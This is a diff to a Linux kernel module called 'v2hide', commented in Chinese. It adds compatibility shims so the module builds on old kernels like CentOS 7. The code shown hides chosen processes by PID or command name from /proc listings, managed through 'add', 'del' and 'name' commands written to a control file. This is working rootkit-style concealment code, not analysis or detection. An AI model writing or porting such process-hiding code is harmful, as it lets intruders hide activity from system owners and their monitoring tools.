@@ -40,7 +40,87 @@
 #include <linux/slab.h>
 #include <linux/namei.h>
 #include <linux/kobject.h>
+#include <linux/rcupdate.h>
+#include <linux/errno.h>
 
+/* ---------------- 老内核兼容层（CentOS 7 / 3.10 等） ---------------- */
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 6, 0)
+/* 3.10 无 kstrtol，用 simple_strtol + 手工校验 */
+static int v2hide_kstrtol(const char *s, int base, long *res)
+{
+	char *end;
+	long v;
+
+	if (!s || !*s)
+		return -EINVAL;
+	v = simple_strtol(s, &end, base);
+	if (end == s)
+		return -EINVAL;
+	while (*end == ' ' || *end == '\t' || *end == '\n')
+		end++;
+	if (*end)
+		return -EINVAL;
+	*res = v;
+	return 0;
+}
+#define v2hide_strtol(s, b, r) v2hide_kstrtol((s), (b), (r))
+#else
+#define v2hide_strtol(s, b, r) kstrtol((s), (b), (r))
+#endif
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 14, 0)
+/* 3.10 无 strim：就地去掉首尾空白 */
+static char *v2hide_strim(char *s)
+{
+	char *end;
+
+	while (*s == ' ' || *s == '\t' || *s == '\n' || *s == '\r')
+		s++;
+	if (!*s)
+		return s;
+	end = s + strlen(s) - 1;
+	while (end > s && (*end == ' ' || *end == '\t' || *end == '\n' || *end == '\r'))
+		*end-- = 0;
+	return s;
+}
+#define v2hide_strim(s) v2hide_strim(s)
+#else
+#define v2hide_strim(s) strim(s)
+#endif
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 3, 0)
+/* 4.3 之前无 strscpy */
+static ssize_t v2hide_strscpy(char *dst, const char *src, size_t len)
+{
+	size_t n = strlen(src);
+
+	if (len == 0)
+		return -E2BIG;
+	if (n >= len) {
+		memcpy(dst, src, len - 1);
+		dst[len - 1] = 0;
+		return -E2BIG;
+	}
+	memcpy(dst, src, n + 1);
+	return (ssize_t)n;
+}
+#define v2hide_strscpy(d, s, l) v2hide_strscpy((d), (s), (l))
+#else
+#define v2hide_strscpy(d, s, l) strscpy((d), (s), (l))
+#endif
+
+/* 3.10 的 find_task_by_vpid 需要 rcu 保护 */
+static struct task_struct *v2hide_find_task(pid_t pid)
+{
+	struct task_struct *t;
+
+	rcu_read_lock();
+	t = find_task_by_vpid(pid);
+	if (t)
+		get_task_struct(t);
+	rcu_read_unlock();
+	return t;
+}
 #define V2HIDE_MAX_PIDS 64
 #define V2HIDE_MAX_FRAMES 32
 #define V2HIDE_MAX_NAMES 16
@@ -131,7 +211,7 @@ static int name_is_hidden(const char *name, int namlen)
 		return 1;
 
 	if (buf[0] >= '0' && buf[0] <= '9') {
-		if (kstrtol(buf, 10, &val) != 0 || val <= 0)
+		if (v2hide_strtol(buf, 10, &val) != 0 || val <= 0)
 			return 0;
 		pid = (pid_t)val;
 		/* 隐藏进程自己看自己不受影响，保证 /proc/self 可用 */
@@ -140,7 +220,7 @@ static int name_is_hidden(const char *name, int namlen)
 		if (pid_is_hidden(pid))
 			return 1;
 		{
-			struct task_struct *t = find_task_by_vpid(pid);
+			struct task_struct *t = v2hide_find_task(pid);
 			if (t) {
 				int hit = comm_is_hidden(t->comm);
 				put_task_struct(t);
@@ -361,18 +441,16 @@ static ssize_t v2hide_write(struct file *file, const char __user *ubuf, size_t l
 	if (copy_from_user(kbuf, ubuf, len))
 		return -EFAULT;
 	kbuf[len] = 0;
-	strim(kbuf);
-
-	cmd = kbuf;
-	arg = strchr(kbuf, ' ');
+	cmd = v2hide_strim(kbuf);
+	arg = strchr(cmd, ' ');
 	if (arg) {
 		*arg = 0;
 		arg++;
-		strim(arg);
+		arg = v2hide_strim(arg);
 	}
 
 	if (!strcmp(cmd, "add") && arg) {
-		if (kstrtol(arg, 10, &val) || val <= 0)
+		if (v2hide_strtol(arg, 10, &val) || val <= 0)
 			return -EINVAL;
 		spin_lock_irqsave(&v2hide_lock, flags);
 		if (hidden_pid_count < V2HIDE_MAX_PIDS) {
@@ -385,7 +463,7 @@ static ssize_t v2hide_write(struct file *file, const char __user *ubuf, size_t l
 		}
 		spin_unlock_irqrestore(&v2hide_lock, flags);
 	} else if (!strcmp(cmd, "del") && arg) {
-		if (kstrtol(arg, 10, &val))
+		if (v2hide_strtol(arg, 10, &val))
 			return -EINVAL;
 		spin_lock_irqsave(&v2hide_lock, flags);
 		for (i = 0; i < hidden_pid_count; i++) {
@@ -399,7 +477,7 @@ static ssize_t v2hide_write(struct file *file, const char __user *ubuf, size_t l
 	} else if (!strcmp(cmd, "name") && arg) {
 		spin_lock_irqsave(&v2hide_lock, flags);
 		if (hidden_name_count < V2HIDE_MAX_NAMES) {
-			strscpy(hidden_names[hidden_name_count], arg, 32);
+			v2hide_strscpy(hidden_names[hidden_name_count], arg, 32);
 			hidden_name_count++;
 		}
 		spin_unlock_irqrestore(&v2hide_lock, flags);
